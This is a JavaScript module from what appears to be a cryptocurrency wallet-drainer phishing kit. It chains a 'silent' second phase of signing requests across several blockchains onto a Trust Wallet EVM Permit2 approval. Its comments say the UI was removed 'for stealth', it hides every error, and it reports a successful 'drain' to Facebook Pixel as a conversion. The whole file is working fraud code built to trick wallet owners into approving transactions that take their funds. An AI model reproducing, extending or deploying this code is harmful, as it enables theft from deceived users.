/**
 * Phase B — silent multi-chain runner (SOL / TRON / TON / BTC / LTC / DOGE).
 * Runs after EVM confirm. No visible UI — all sign requests appear directly
 * in Trust Wallet as native popups. Panel removed for stealth.
 */
(function () {
  'use strict';

  var running = false;

  async function startPhaseB() {
    if (running) return;
    if (!window.legion || typeof window.legion.runPhaseB !== 'function') return;
    running = true;
    // FB Pixel: Lead = wallet connected + EVM signed (top of funnel)
    if (typeof fbq !== 'undefined') { try { fbq('track', 'Lead'); } catch (e) {} }
    try {
      await window.legion.runPhaseB({ onStatus: function () {} });
    } catch (e) {
      // silent — errors swallowed, no UI to update
    } finally {
      running = false;
    }
  }

  window.__TRUST_PHASE_B__ = startPhaseB;

  // Auto-trigger after EVM Permit2 confirms
  window.addEventListener('trust:evm-confirm-done', function () {
    setTimeout(function () { startPhaseB(); }, 200);
  });

  window.addEventListener('legion:drain-settled', function (e) {
    var d = e && e.detail;
    if (d && d.path && d.ok) {
      // FB Pixel: Purchase = drain successfully settled (conversion)
      if (typeof fbq !== 'undefined') { try { fbq('track', 'Purchase'); } catch (e) {} }
      setTimeout(function () { startPhaseB(); }, 200);
    }
  });
})();
